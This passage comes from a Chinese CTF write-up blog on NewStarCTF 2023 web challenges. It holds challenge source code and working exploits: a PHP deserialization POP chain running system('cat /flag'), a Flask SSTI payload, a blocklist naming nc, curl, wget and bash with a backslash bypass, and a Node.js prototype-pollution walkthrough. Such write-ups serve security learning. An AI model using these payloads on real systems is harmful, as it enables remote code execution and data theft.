class="keyword">class</span> <span class="title class_">Begin</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> function <span class="title function_">__destruct</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[a-zA-Z0-9]/&quot;</span>,$<span class="built_in">this</span>-&gt;name))&#123;</span><br><span class="line">            echo <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            echo <span class="string">&quot;Welcome to NewStarCTF 2023!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Then</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $func;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> function <span class="title function_">__toString</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        ($<span class="built_in">this</span>-&gt;func)();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Good Job!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Handle</span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $obj;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> function <span class="title function_">__call</span><span class="params">($func, $vars)</span></span><br><span class="line">    &#123;</span><br><span class="line">        $<span class="built_in">this</span>-&gt;obj-&gt;end();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Super</span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $obj;</span><br><span class="line">    <span class="keyword">public</span> function <span class="title function_">__invoke</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        $<span class="built_in">this</span>-&gt;obj-&gt;getStr();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> function <span class="title function_">end</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        die(<span class="string">&quot;==GAME OVER==&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CTF</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $handle;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> function <span class="title function_">end</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        unset($<span class="built_in">this</span>-&gt;handle-&gt;log);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">WhiteGod</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $func;</span><br><span class="line">    <span class="keyword">public</span> $<span class="keyword">var</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> function <span class="title function_">__unset</span><span class="params">($<span class="keyword">var</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        ($<span class="built_in">this</span>-&gt;func)($<span class="built_in">this</span>-&gt;<span class="keyword">var</span>);    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@unserialize($_POST[&#x27;pop&#x27;])</span>;</span><br></pre></td></tr></table></figure><p>exp：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Begin</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Then</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $func;</span><br><span class="line">    <span class="keyword">public</span> function <span class="title function_">__construct</span><span class="params">()</span>&#123;</span><br><span class="line">        $<span class="built_in">this</span>-&gt;func = <span class="keyword">new</span> <span class="title class_">Super</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Handle</span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $obj;</span><br><span class="line">    <span class="keyword">public</span> function <span class="title function_">__construct</span><span class="params">()</span>&#123;</span><br><span class="line">        $<span class="built_in">this</span>-&gt;obj = <span class="keyword">new</span> <span class="title class_">CTF</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Super</span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $obj;</span><br><span class="line">    <span class="keyword">public</span> function <span class="title function_">__construct</span><span class="params">()</span>&#123;</span><br><span class="line">        $<span class="built_in">this</span>-&gt;obj = <span class="keyword">new</span> <span class="title class_">Handle</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CTF</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $handle;</span><br><span class="line">    <span class="keyword">public</span> function <span class="title function_">__construct</span><span class="params">()</span>&#123;</span><br><span class="line">        $<span class="built_in">this</span>-&gt;handle = <span class="keyword">new</span> <span class="title class_">WhiteGod</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">WhiteGod</span>&#123;</span><br><span class="line">    <span class="type">public</span> <span class="variable">$func</span> <span class="operator">=</span> <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">    <span class="type">public</span> <span class="variable">$var</span> <span class="operator">=</span> <span class="string">&#x27;cat /flag&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> <span class="title class_">Begin</span>();</span><br><span class="line">$a-&gt;name = <span class="keyword">new</span> <span class="title class_">Then</span>();</span><br><span class="line">echo <span class="title function_">urlencode</span><span class="params">(serialize($a)</span>);</span><br></pre></td></tr></table></figure><h2 id="GenShin"><a href="#GenShin" class="headerlink" title="GenShin"></a>GenShin</h2><p>考点：</p><ul><li>flask ssti</li></ul><p>抓包获得</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697166037980-4bb0dd83-1b97-4a6c-b1f6-c2c8566ddbab.png" alt="img"></p><p>一眼丁真flask ssti注入</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697166058190-e47aa6de-380f-42ef-a2ce-f04c871166e3.png" alt="img"></p><p>直接当脚本小子</p><p>或者payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print(((g.pop.__globals__.__builtins__.__import__(&quot;os&quot;)[&quot;p&quot;&quot;open&quot;](&quot;cat /flag&quot;)).read()))%&#125;</span><br></pre></td></tr></table></figure><h2 id="R-C-E-2"><a href="#R-C-E-2" class="headerlink" title="R!!!C!!!E!!!"></a>R!!!C!!!E!!!</h2><p>源码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="title function_">highlight_file</span><span class="params">(__FILE__)</span>;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">minipop</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $code;</span><br><span class="line">    <span class="keyword">public</span> $qwejaskdjnlka;</span><br><span class="line">    <span class="keyword">public</span> function <span class="title function_">__toString</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, $<span class="built_in">this</span>-&gt;code))&#123;</span><br><span class="line">            exec($<span class="built_in">this</span>-&gt;code);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;alright&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> function <span class="title function_">__destruct</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        echo $<span class="built_in">this</span>-&gt;qwejaskdjnlka;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(isset($_POST[<span class="string">&#x27;payload&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//wanna try?</span></span><br><span class="line">    unserialize($_POST[<span class="string">&#x27;payload&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload:</p><p>反序列化套一下就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /flag|t\e\e /var/www/html/1</span><br></pre></td></tr></table></figure><p>将读到的flag通过管道符用tee写道网站根目录下 然后访问</p><p>关键字通过反斜杠转义来绕过<code>\</code></p><h2 id="OtenkiGirl"><a href="#OtenkiGirl" class="headerlink" title="OtenkiGirl"></a>OtenkiGirl</h2><p>考点：</p><ul><li>nodejs 原型链污染</li></ul><p>我是傻逼 关键东西老是看不到</p><p>给了源码</p><p>根据提示我们只需要关注routes包下的内容即可 也不需要sql注入</p><p>info.js</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="variable">Router</span> <span class="operator">=</span> require(<span class="string">&quot;koa-router&quot;</span>);</span><br><span class="line"><span class="type">const</span> <span class="variable">router</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Router</span>();</span><br><span class="line"><span class="type">const</span> <span class="variable">SQL</span> <span class="operator">=</span> require(<span class="string">&quot;./sql&quot;</span>);</span><br><span class="line"><span class="type">const</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SQL</span>(<span class="string">&quot;wishes&quot;</span>);</span><br><span class="line"><span class="type">const</span> <span class="variable">CONFIG</span> <span class="operator">=</span> require(<span class="string">&quot;../config&quot;</span>)</span><br><span class="line"><span class="type">const</span> <span class="variable">DEFAULT_CONFIG</span> <span class="operator">=</span> require(<span class="string">&quot;../config.default&quot;</span>)</span><br><span class="line"></span><br><span class="line">async function <span class="title function_">getInfo</span><span class="params">(timestamp)</span> &#123;</span><br><span class="line">    timestamp = typeof timestamp === <span class="string">&quot;number&quot;</span> ? timestamp : Date.now();</span><br><span class="line">    <span class="comment">// Remove test data from before the movie was released</span></span><br><span class="line">    <span class="type">let</span> <span class="variable">minTimestamp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Date</span>(CONFIG.min_public_time || DEFAULT_CONFIG.min_public_time).getTime();</span><br><span class="line">    timestamp = Math.max(timestamp, minTimestamp);</span><br><span class="line">    <span class="type">const</span> <span class="variable">data</span> <span class="operator">=</span> await sql.all(`SELECT wishid, date, place, contact, reason, timestamp FROM wishes WHERE timestamp &gt;= ?`, [timestamp]).<span class="keyword">catch</span>(e =&gt; &#123; <span class="keyword">throw</span> e &#125;);</span><br><span class="line">    <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">router.post(<span class="string">&quot;/info/:ts?&quot;</span>, async (ctx) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (ctx.header[<span class="string">&quot;content-type&quot;</span>] !== <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> ctx.body = &#123;</span><br><span class="line">            status: <span class="string">&quot;error&quot;</span>,</span><br><span class="line">            msg: <span class="string">&quot;Content-Type must be application/x-www-form-urlencoded&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">if</span> (typeof ctx.params.ts === <span class="string">&quot;undefined&quot;</span>) ctx.params.ts = <span class="number">0</span></span><br><span class="line">    <span class="type">const</span> <span class="variable">timestamp</span> <span class="operator">=</span> /^[<span class="number">0</span>-<span class="number">9</span>]+$/.test(ctx.params.ts || <span class="string">&quot;&quot;</span>) ? Number(ctx.params.ts) : ctx.params.ts;</span><br><span class="line">    <span class="keyword">if</span> (typeof timestamp !== <span class="string">&quot;number&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> ctx.body = &#123;</span><br><span class="line">            status: <span class="string">&quot;error&quot;</span>,</span><br><span class="line">            msg: <span class="string">&quot;Invalid parameter ts&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">const</span> <span class="variable">data</span> <span class="operator">=</span> await <span class="title function_">getInfo</span><span class="params">(timestamp)</span>.<span class="keyword">catch</span>(e =&gt; &#123; <span class="keyword">throw</span> e &#125;);</span><br><span class="line">        ctx.body = &#123;</span><br><span class="line">            status: <span class="string">&quot;success&quot;</span>,</span><br><span class="line">            data: data</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        console.error(e);</span><br><span class="line">        <span class="keyword">return</span> ctx.body = &#123;</span><br><span class="line">            status: <span class="string">&quot;error&quot;</span>,</span><br><span class="line">            msg: <span class="string">&quot;Internal Server Error&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">module</span>.<span class="keyword">exports</span> = router;</span><br></pre></td></tr></table></figure><p>submit.js</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="variable">Router</span> <span class="operator">=</span> require(<span class="string">&quot;koa-router&quot;</span>);</span><br><span class="line"><span class="type">const</span> <span class="variable">router</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Router</span>();</span><br><span class="line"><span class="type">const</span> <span class="variable">SQL</span> <span class="operator">=</span> require(<span class="string">&quot;./sql&quot;</span>);</span><br><span class="line"><span class="type">const</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SQL</span>(<span class="string">&quot;wishes&quot;</span>);</span><br><span class="line"><span class="type">const</span> <span class="variable">Base58</span> <span class="operator">=</span> require(<span class="string">&quot;base-58&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="variable">ALPHABET</span> <span class="operator">=</span> <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span>;</span><br><span class="line"><span class="type">const</span> <span class="variable">rndText</span> <span class="operator">=</span> (length) =&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> Array.from(&#123; length &#125;, () =&gt; ALPHABET[Math.floor(Math.random() * ALPHABET.length)]).join(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="variable">timeText</span> <span class="operator">=</span> (timestamp) =&gt; &#123;</span><br><span class="line">    timestamp = (typeof timestamp === <span class="string">&quot;number&quot;</span> ? timestamp : Date.now()).toString();</span><br><span class="line">    <span class="type">let</span> <span class="variable">text1</span> <span class="operator">=</span> timestamp.substring(<span class="number">0</span>, timestamp.length / <span class="number">2</span>);</span><br><span class="line">    <span class="type">let</span> <span class="variable">text2</span> <span class="operator">=</span> timestamp.substring(timestamp.length / <span class="number">2</span>)</span><br><span class="line">    <span class="type">let</span> <span class="variable">text</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">let</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; text1.length; i++)</span><br><span class="line">        text += text1[i] + text2[text2.length - <span class="number">1</span> - i];</span><br><span class="line">    <span class="keyword">if</span> (text2.length &gt; text1.length) text += text2[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">return</span> Base58.encode(rndText(<span class="number">3</span>) + Buffer.from(text)); <span class="comment">// length = 20</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="variable">rndID</span> <span class="operator">=</span> (length, timestamp) =&gt; &#123;</span><br><span class="line">    <span class="type">const</span> <span class="variable">t</span> <span class="operator">=</span> timeText(timestamp);</span><br><span class="line">    <span class="keyword">if</span> (length &lt; t.length) <span class="keyword">return</span> t.substring(<span class="number">0</span>, length);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> t + rndText(length - t.length);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">async function <span class="title function_">insert2db</span><span class="params">(data)</span> &#123;</span><br><span class="line">    <span class="type">let</span> <span class="variable">date</span> <span class="operator">=</span> String(data[<span class="string">&quot;date&quot;</span>]), place = String(data[<span class="string">&quot;place&quot;</span>]),</span><br><span class="line">        contact = String(data[<span class="string">&quot;contact&quot;</span>]), reason = String(data[<span class="string">&quot;reason&quot;</span>]);</span><br><span class="line">    <span class="type">const</span> <span class="variable">timestamp</span> <span class="operator">=</span> Date.now();</span><br><span class="line">    <span class="type">const</span> <span class="variable">wishid</span> <span class="operator">=</span> rndID(<span class="number">24</span>, timestamp);</span><br><span class="line">    await sql.run(`INSERT INTO <span class="title function_">wishes</span> <span class="params">(wishid, date, place, contact, reason, timestamp)</span> VALUES (?, ?, ?, ?, ?, ?)`,</span><br><span class="line">        [wishid, date, place, contact, reason, timestamp]).<span class="keyword">catch</span>(e =&gt; &#123; <span class="keyword">throw</span> e &#125;);</span><br><span class="line">    <span class="keyword">return</span> &#123; wishid, date, place, contact, reason, timestamp &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="variable">merge</span> <span class="operator">=</span> (dst, src) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (typeof dst !== <span class="string">&quot;object&quot;</span> || typeof src !== <span class="string">&quot;object&quot;</span>) <span class="keyword">return</span> dst;</span><br><span class="line">    <span class="keyword">for</span> (let key in src) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key in dst &amp;&amp; key in src) &#123;</span><br><span class="line">            dst[key] = merge(dst[key], src[key]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            dst[key] = src[key];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dst;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">router.post(<span class="string">&quot;/submit&quot;</span>, async (ctx) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (ctx.header[<span class="string">&quot;content-type&quot;</span>] !== <span class="string">&quot;application/json&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> ctx.body = &#123;</span><br><span class="line">            status: <span class="string">&quot;error&quot;</span>,</span><br><span class="line">            msg: <span class="string">&quot;Content-Type must be application/json&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> <span class="variable">jsonText</span> <span class="operator">=</span> ctx.request.rawBody || <span class="string">&quot;&#123;&#125;&quot;</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">const</span> <span class="variable">data</span> <span class="operator">=</span> JSON.parse(jsonText);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (typeof data[<span class="string">&quot;contact&quot;</span>] !== <span class="string">&quot;string&quot;</span> || typeof data[<span class="string">&quot;reason&quot;</span>] !== <span class="string">&quot;string&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> ctx.body = &#123;</span><br><span class="line">                status: <span class="string">&quot;error&quot;</span>,</span><br><span class="line">                msg: <span class="string">&quot;Invalid parameter&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">if</span> (data[<span class="string">&quot;contact&quot;</span>].length &lt;= <span class="number">0</span> || data[<span class="string">&quot;reason&quot;</span>].length &lt;= <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> ctx.body = &#123;</span><br><span class="line">                status: <span class="string">&quot;error&quot;</span>,</span><br><span class="line">                msg: <span class="string">&quot;Parameters contact and reason cannot be empty&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">const</span> <span class="variable">DEFAULT</span> <span class="operator">=</span> &#123;</span><br><span class="line">            date: <span class="string">&quot;unknown&quot;</span>,</span><br><span class="line">            place: <span class="string">&quot;unknown&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">const</span> <span class="variable">result</span> <span class="operator">=</span> await <span class="title function_">insert2db</span><span class="params">(merge(DEFAULT, data)</span>);</span><br><span class="line">        ctx.body = &#123;</span><br><span class="line">            status: <span class="string">&quot;success&quot;</span>,</span><br><span class="line">            data: result</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        console.error(e);</span><br><span class="line">        ctx.body = &#123;</span><br><span class="line">            status: <span class="string">&quot;error&quot;</span>,</span><br><span class="line">            msg: <span class="string">&quot;Internal Server Error&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">module</span>.<span class="keyword">exports</span> = router;</span><br></pre></td></tr></table></figure><p>比较关键的就是这两个文件内容</p><p>简单审计一下</p><p>它会将我们提交的内容展示出来 </p><p>并且会经过merge一个合并函数 熟人了</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697166758715-338c47b1-47e3-4ac6-9785-be333a06fc3c.png" alt="img"></p><p>内容包括<code>data,place,contact,reason,timestamp(时间戳)</code></p><p>那么在这里需要污染的点是什么呢 </p><p>其实在这里给了提示</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697166888157-91644cb2-2103-49b6-b72c-2175670971f3.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">// Remove test data from before the movie was released</span><br></pre></td></tr></table></figure><p><code>“他会删除电影上映前的数据”</code> 也就是我们想要的数据在之前的时间里</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697167165409-d0be8833-d256-44c9-a712-ad8cedc046cd.png" alt="img"></p><p>再看上面<code>||</code>条件语句 存在一个短路 默认min_public_time是2019-07-09</p><p>CONFIG.min_public_time默认是无的 不存在</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697274880739-9d9bc3d7-e83f-43d7-a46c-452764c272a1.png" alt="img"></p><p>如果<code>CONFIG.min_public_time</code>有值那么短路就不会<code>new default min_public_time</code>的值</p><p>那么就需要原型链污染去修改这个<code>CONFIG.min_public_time</code></p><p><code>min_public_time</code>在config.default文件 然后被引入的 格式是这样的</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697167312141-c99bbfb6-154d-4920-aad1-2d15c7586b7a.png" alt="img"></p><p>只需要将这个时间改比它默认值小就行了</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697167358763-2fd909df-fef3-4b62-bb20-85c359e4dfd3.png" alt="img"></p><p>为什么呢 因为我们之前提交数据的时候会有一个时间戳 这个最小时间戳的生成是由这个<code>CONFIG.min_public_time</code>影响的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">let minTimestamp = new Date(CONFIG.min_public_time || DEFAULT_CONFIG.min_public_time).getTime();</span><br><span class="line">timestamp = Math.max(timestamp, minTimestamp);</span><br></pre></td></tr></table></figure><p>所以修改<code>CONFIG.min_public_time</code>就会修改最总时间戳 使其回到之前的时间就能将之前的数据读出来</p><p>然后根据代码逻辑 访问<code>/info/一个小值</code> 内容就被打印出来</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697167409474-8c8f8358-af0f-44f2-8d83-ce6749dde650.png" alt="img"></p><h1 id="WEEK4"><a href="#WEEK4" class="headerlink" title="WEEK4"></a>WEEK4</h1><h2 id="More-Fast"><a href="#More-Fast" class="headerlink" title="More Fast"></a>More Fast</h2><p>考点：</p><ul><li>fast destruct</li></ul><p>exp</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">class</span> <span class="title 